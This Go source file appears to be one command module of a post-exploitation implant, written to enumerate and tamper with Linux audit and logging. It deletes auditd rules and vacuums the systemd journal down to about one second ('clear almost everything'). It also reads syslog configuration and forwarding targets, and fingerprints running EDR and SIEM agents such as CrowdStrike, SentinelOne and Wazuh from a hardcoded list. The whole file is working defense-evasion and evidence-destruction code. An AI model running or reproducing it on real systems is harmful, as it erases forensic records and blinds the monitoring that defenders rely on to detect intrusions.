//go:build linux
// +build linux

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type EtwCommand struct{}

func (c *EtwCommand) Name() string {
	return "etw"
}

func (c *EtwCommand) Description() string {
	return "Enumerate and manipulate Linux audit subsystems (auditd, journald, syslog) and detect SIEM agents"
}

type etwParams struct {
	Action      string `json:"action"`
	SessionName string `json:"session_name"` // reused: rule filter for auditd
	Provider    string `json:"provider"`     // reused: service/syscall target
}

func (c *EtwCommand) Execute(task structs.Task) structs.CommandResult {
	var params etwParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.Action == "" {
		params.Action = "rules"
	}

	switch params.Action {
	case "rules":
		return auditRules()
	case "disable-rule":
		return auditDisableRule(params.SessionName)
	case "journal-clear":
		return journalClear(params.Provider)
	case "journal-rotate":
		return journalRotate()
	case "syslog-config":
		return syslogConfig()
	case "agents":
		return detectSIEMAgents()
	case "audit-status":
		return auditStatus()
	default:
		return errorf("Unknown action: %s (use rules, disable-rule, journal-clear, journal-rotate, syslog-config, agents, audit-status)", params.Action)
	}
}

// auditRules enumerates active auditd rules
func auditRules() structs.CommandResult {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "auditctl", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		// auditctl may not be installed or user may lack permissions
		if strings.Contains(string(output), "permission denied") || strings.Contains(err.Error(), "permission denied") {
			return errorResult("Error: auditctl requires root privileges")
		}
		if exec.ErrNotFound != nil {
			// Try reading rules directly from audit.rules file
			return auditRulesFromFile()
		}
		return errorf("Error running auditctl: %v\n%s", err, string(output))
	}

	result := "[+] Active Audit Rules\n"
	rules := strings.TrimSpace(string(output))
	if rules == "" || rules == "No rules" {
		result += "No active audit rules\n"
	} else {
		result += rules + "\n"
	}

	// Count rules for summary
	lines := strings.Split(rules, "\n")
	ruleCount := 0
	for _, line := range lines {
		if strings.TrimSpace(line) != "" && !strings.HasPrefix(line, "No rules") {
			ruleCount++
		}
	}
	result += fmt.Sprintf("\n[*] Total: %d active rules", ruleCount)

	return successResult(result)
}

// auditRulesFromFile reads audit rules from config files when auditctl is unavailable
func auditRulesFromFile() structs.CommandResult {
	paths := []string{
		"/etc/audit/audit.rules",
		"/etc/audit/rules.d/audit.rules",
	}

	var result strings.Builder
	result.WriteString("[+] Audit Rules (from config files)\n")
	found := false

	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		found = true
		result.WriteString(fmt.Sprintf("\n--- %s ---\n", path))
		for _, line := range strings.Split(string(data), "\n") {
			trimmed := strings.TrimSpace(line)
			if trimmed == "" || strings.HasPrefix(trimmed, "#") {
				continue
			}
			result.WriteString(trimmed + "\n")
		}
	}

	if !found {
		return errorResult("Error: auditctl not available and no audit rules files found")
	}

	return successResult(result.String())
}

// auditDisableRule disables a specific auditd rule
func auditDisableRule(ruleSpec string) structs.CommandResult {
	if ruleSpec == "" {
		return errorResult("Error: rule specification required in 'session_name' field (e.g., '-w /etc/passwd -p wa')")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	// Build deletion command: auditctl -d [rule]
	args := append([]string{"-d"}, strings.Fields(ruleSpec)...)
	cmd := exec.CommandContext(ctx, "auditctl", args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return errorf("Error disabling audit rule: %v\n%s", err, string(output))
	}

	return successResult(fmt.Sprintf("[+] Disabled audit rule: %s\n%s", ruleSpec, strings.TrimSpace(string(output))))
}

// journalClear clears journal logs with vacuum
func journalClear(duration string) structs.CommandResult {
	if duration == "" {
		duration = "1s" // clear almost everything
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "journalctl", "--rotate")
	output, err := cmd.CombinedOutput()
	rotateResult := string(output)
	if err != nil {
		return errorf("Error rotating journal: %v\n%s", err, rotateResult)
	}

	ctx2, cancel2 := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel2()

	cmd2 := exec.CommandContext(ctx2, "journalctl", "--vacuum-time="+duration)
	output2, err2 := cmd2.CombinedOutput()
	if err2 != nil {
		return errorf("Error vacuuming journal: %v\n%s", err2, string(output2))
	}

	return successResult(fmt.Sprintf("[+] Journal rotated and vacuumed (time=%s)\n%s\n%s",
		duration, strings.TrimSpace(rotateResult), strings.TrimSpace(string(output2))))
}

// journalRotate rotates journal files without clearing
func journalRotate() structs.CommandResult {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "journalctl", "--rotate")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return errorf("Error rotating journal: %v\n%s", err, string(output))
	}

	return successResult(fmt.Sprintf("[+] Journal rotated\n%s", strings.TrimSpace(string(output))))
}

// syslogConfig enumerates syslog configuration
func syslogConfig() structs.CommandResult {
	var result strings.Builder
	result.WriteString("[+] Syslog Configuration\n")

	// Check rsyslog
	configPaths := []string{
		"/etc/rsyslog.conf",
		"/etc/syslog-ng/syslog-ng.conf",
		"/etc/syslog.conf",
	}

	for _, path := range configPaths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		result.WriteString(fmt.Sprintf("\n--- %s ---\n", path))
		for _, line := range strings.Split(string(data), "\n") {
			trimmed := strings.TrimSpace(line)
			if trimmed == "" || strings.HasPrefix(trimmed, "#") {
				continue
			}
			result.WriteString(trimmed + "\n")
		}
	}

	// Check rsyslog.d directory for additional configs
	rsyslogD := "/etc/rsyslog.d"
	entries, err := os.ReadDir(rsyslogD)
	if err == nil {
		for _, entry := range entries {
			if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".conf") {
				continue
			}
			fullPath := filepath.Join(rsyslogD, entry.Name())
			data, err := os.ReadFile(fullPath)
			if err != nil {
				continue
			}
			result.WriteString(fmt.Sprintf("\n--- %s ---\n", fullPath))
			for _, line := range strings.Split(string(data), "\n") {
				trimmed := strings.TrimSpace(line)
				if trimmed == "" || strings.HasPrefix(trimmed, "#") {
					continue
				}
				result.WriteString(trimmed + "\n")
			}
		}
	}

	// Check log forwarding destinations
	result.WriteString("\n--- Log Forwarding ---\n")
	for _, path := range configPaths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			trimmed := strings.TrimSpace(line)
			if strings.Contains(trimmed, "@@") || strings.Contains(trimmed, "@") {
				if !strings.HasPrefix(trimmed, "#") {
					result.WriteString(fmt.Sprintf("  Forward: %s\n", trimmed))
				}
			}
		}
	}

	return successResult(result.String())
}

// siemAgent describes a known SIEM/security agent
type siemAgent struct {
	Name        string
	ProcessName []string // process names to look for
	InstallPath []string // installation directories to check
}

var knownSIEMAgents = []siemAgent{
	{"Wazuh", []string{"wazuh-agentd", "ossec-agentd", "wazuh-modulesd"}, []string{"/var/ossec", "/opt/wazuh"}},
	{"osquery", []string{"osqueryd", "osqueryi"}, []string{"/opt/osquery", "/usr/local/osquery"}},
	{"Elastic Agent", []string{"elastic-agent", "filebeat", "auditbeat", "metricbeat", "packetbeat"}, []string{"/opt/Elastic", "/usr/share/elastic-agent", "/usr/share/filebeat"}},
	{"CrowdStrike Falcon", []string{"falcon-sensor", "falcond"}, []string{"/opt/CrowdStrike"}},
	{"SentinelOne", []string{"sentineld", "sentinelagent"}, []string{"/opt/sentinelone"}},
	{"Carbon Black", []string{"cbagentd", "cbdaemon"}, []string{"/opt/carbonblack", "/var/lib/cb"}},
	{"Qualys", []string{"qualys-cloud-agent"}, []string{"/usr/local/qualys"}},
	{"Rapid7", []string{"ir_agent"}, []string{"/opt/rapid7"}},
	{"Tanium", []string{"TaniumClient"}, []string{"/opt/Tanium"}},
	{"Lacework", []string{"datacollector"}, []string{"/var/lib/lacework"}},
	{"Sysdig Falco", []string{"falco"}, []string{"/usr/bin/falco", "/opt/falco"}},
	{"Auditd", []string{"auditd"}, []string{"/sbin/auditd", "/usr/sbin/auditd"}},
	{"Suricata", []string{"suricata"}, []string{"/usr/bin/suricata"}},
	{"Snort", []string{"snort"}, []string{"/usr/sbin/snort", "/usr/local/bin/snort"}},
}

// detectSIEMAgents checks for running SIEM/security agents
func detectSIEMAgents() structs.CommandResult {
	type agentResult struct {
		Name      string `json:"name"`
		Status    string `json:"status"`
		Process   string `json:"process,omitempty"`
		PID       string `json:"pid,omitempty"`
		InstallAt string `json:"install_path,omitempty"`
	}

	var results []agentResult

	// Read all process comm names from /proc
	procEntries, _ := os.ReadDir("/proc")
	runningProcs := make(map[string]string) // name -> pid
	for _, entry := range procEntries {
		if !entry.IsDir() {
			continue
		}
		pid := entry.Name()
		// Check if it's a numeric PID
		if len(pid) == 0 || pid[0] < '0' || pid[0] > '9' {
			continue
		}
		comm, err := os.ReadFile(filepath.Join("/proc", pid, "comm"))
		if err != nil {
			continue
		}
		name := strings.TrimSpace(string(comm))
		runningProcs[name] = pid
	}

	for _, agent := range knownSIEMAgents {
		found := false
		var r agentResult
		r.Name = agent.Name

		// Check running processes
		for _, procName := range agent.ProcessName {
			if pid, ok := runningProcs[procName]; ok {
				r.Status = "running"
				r.Process = procName
				r.PID = pid
				found = true
				break
			}
		}

		// Check install paths
		if !found {
			for _, path := range agent.InstallPath {
				if _, err := os.Stat(path); err == nil {
					r.Status = "installed"
					r.InstallAt = path
					found = true
					break
				}
			}
		}

		if found {
			results = append(results, r)
		}
	}

	if len(results) == 0 {
		return successResult(`{"agents":[],"message":"No known SIEM/security agents detected"}`)
	}

	output, err := json.MarshalIndent(map[string]interface{}{
		"agents": results,
		"total":  len(results),
	}, "", "  ")
	if err != nil {
		return errorf("Error marshaling results: %v", err)
	}

	return successResult(string(output))
}

// auditStatus shows the current audit system status
func auditStatus() structs.CommandResult {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "auditctl", "-s")
	output, err := cmd.CombinedOutput()
	if err != nil {
		// Try reading status from /proc
		data, err2 := os.ReadFile("/proc/sys/kernel/audit_enabled")
		if err2 != nil {
			return errorf("Error getting audit status: %v\n%s", err, string(output))
		}
		enabled := strings.TrimSpace(string(data))
		result := fmt.Sprintf("[+] Audit Subsystem Status\n")
		result += fmt.Sprintf("  kernel/audit_enabled: %s", enabled)
		switch enabled {
		case "0":
			result += " (disabled)"
		case "1":
			result += " (enabled)"
		case "2":
			result += " (enabled, locked - cannot change until reboot)"
		}
		return successResult(result)
	}

	return successResult(fmt.Sprintf("[+] Audit Subsystem Status\n%s", strings.TrimSpace(string(output))))
}
